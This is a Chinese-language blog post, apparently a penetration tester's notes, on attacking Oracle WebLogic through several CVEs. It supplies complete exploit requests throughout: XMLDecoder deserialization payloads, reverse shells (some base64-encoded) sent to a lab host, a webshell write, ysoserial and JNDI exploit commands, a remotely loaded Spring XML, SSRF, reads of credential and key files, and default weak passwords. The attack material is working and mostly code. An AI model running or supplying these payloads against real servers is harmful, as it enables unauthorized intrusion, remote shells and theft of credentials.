+++
title = 'Weblogic'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java组件'
+++

# 一、Weblogic

Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。


在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。

# 二、漏洞介绍与利用

## 1、wls-wsat XMLDecoder 反序列化漏洞（CVE-2017-10271）

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。





影响版本





10.3.6.0.0


12.1.3.0.0


12.2.1.1.0


12.2.1.2.0

检测方式：

POC:

反弹shell记得编码：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![](/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53截图.png)

写shell POC：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

## 2、WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。

检测方式，该漏洞无回显，无法直接梭哈：

![](/zj_img/WEBRESOURCEe4b597f35bb358c84885c54e828ee9c3截图.png)

利用方式：

开启恶意

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"
```

![](/zj_img/WEBRESOURCE8975c6b6dd4d44d0886f32787cd710c2截图.png)

![](/zj_img/WEBRESOURCE899f19d0d38bb6bfb5e8846204c1caf9截图.png)

## 3、Weblogic 任意文件上传漏洞（CVE-2018-2894）

Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。





利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。

**注意：该漏洞工具可做检测，但需要手动上传webshell**

修改工作目录：

```
/ws_utc/config.do
/ws_utc/begin.do  利用方法类似，直接上传即可
```

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。
```

![](/zj_img/WEBRESOURCEae428a3f2e927c9c58f2448ebad10dd6截图.png)

上传webshell即可：

![](/zj_img/WEBRESOURCEe6c667d82d132f0a154e59843a13621d截图.png)

路径为：/ws_utc/css/config/keystore/[时间戳]_[文件名]

![](/zj_img/WEBRESOURCE22e9bcd60200def6281ac624f83f3d7f截图.png)

## 4、Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）

这个漏洞是个组合漏洞，前提是具有

工具无法梭哈，

### 第一步未授权路径：

```
console/css/%252e%252e%252fconsole.portal
```

![](/zj_img/WEBRESOURCE0b811e95332865fcf27ec34e81e65fb2截图.png)

### 第二步，命令执行 Weblogic 12.2.1以上版本：

注意URL编码，使用hackbar成功率高一些，这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类：

```
console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("bash%20-c%20%7Becho,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D");")
```

![](/zj_img/WEBRESOURCEbf0681134320c4e9cae010d94802f03b截图.png)

### 通杀利用方式 XML远程加载：

XML：

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/192.168.2.40/8888 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

POC：

```
console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.2.40:8000/1.xml")
```

![](/zj_img/WEBRESOURCE928696537bd1c5c47b04f7159c8c9fd0截图.png)

### 5、Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)

CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞

无法梭哈发现，需要单独检测，但是工具存在不稳的情况，最好多点几下，同时无法检查无回显的洞

### 第一步，开启LDAP恶意服务：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40
```

### 第二步，发送POC：

是4ra1n的go编写单独工具：

```
main.exe -ip 192.168.2.66 -port 7001 -ldap ldap://192.168.2.40:1389/Basic/ReverseShell/192.168.2.40/8888
```

![](/zj_img/WEBRESOURCE0450a60a233edaeaafa641285cde1927截图.png)

### 或者使用sxf工具梭哈：

![](/zj_img/WEBRESOURCE3ef636e673f680294bef8a1b1a55e646截图.png)

## 6、SSRF(CVE-2014-4210）

SSRF POC：

坑点：注意空格

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.2.40:8000/a HTTP/1.1
Host: 192.168.2.66:7001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0


```




内网探测以及Redis反弹详见SSRF漏洞

## 7、解密应用

①任意文件读取

weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）

```
POC：
GET /hello/file.jsp?path=security/SerializedSystemIni.dat HTTP/1.1
Host: 192.168.2.66:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.2.66:7001/console/login/LoginForm.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ADMINCONSOLESESSION=yRjrkPJPJxb1vQ81c2dxkyGhxNJW1hW2Xpdbc2yy45290T911Gjx!1637882379
Connection: close


```

密钥配置文件：

```
/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat
```

存放加密密码的文件：

```
/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml
/root/Oracle/Middleware/user_projects/domains/base_domain/security/boot.properties
```

![](/zj_img/WEBRESOURCEfa135f8989100d35f20615e4d7bf5e8d截图.png)

**坑点：**

![](/zj_img/WEBRESOURCEe0424f6de8ebf3d6b29a7f505a08bba0截图.png)

同时，使用sxf解密工具也可进行解密：

![](/zj_img/WEBRESOURCEf635276c4a02e8a78b4439e8873a3def截图.png)

②数据库密码获取

数据库文件

```
/root/Oracle/Middleware/user_projects/domains/base_domain/config/jdbc/tide-jdbc.xml
/root/Oracle/Middleware/user_projects/domains/base_domain/security/boot.properties
```

同时还有多种解密方式，jsp类的

## 8、后台war包部署

通过弱密码OR文件包含读取密码等方式，成功登录后台

常见弱密码：

```
system:password  
weblogic:weblogic  
admin:secruity
joe:password  
mary:password  
system:sercurity
wlcsystem: wlcsystem  
weblogic:Oracle@123
```

生成war包，压缩为zip文件，重命名为war

![](/zj_img/WEBRESOURCE29b05633bba9327cdc295267c558a9bb截图.png)

![](/zj_img/WEBRESOURCE11ddfc16dc215e3d21a49c7eee0f214e截图.png)

![](/zj_img/WEBRESOURCE80422d7162a1dd5e18013f5c82064ed6截图.png)

![](/zj_img/WEBRESOURCE24dc9b602240a6faffb4c2a8a21b6f5d截图.png)

然后狂点下一步：

![](/zj_img/WEBRESOURCEa473e0f9dd403edd1a4fe2cefb32a686截图.png)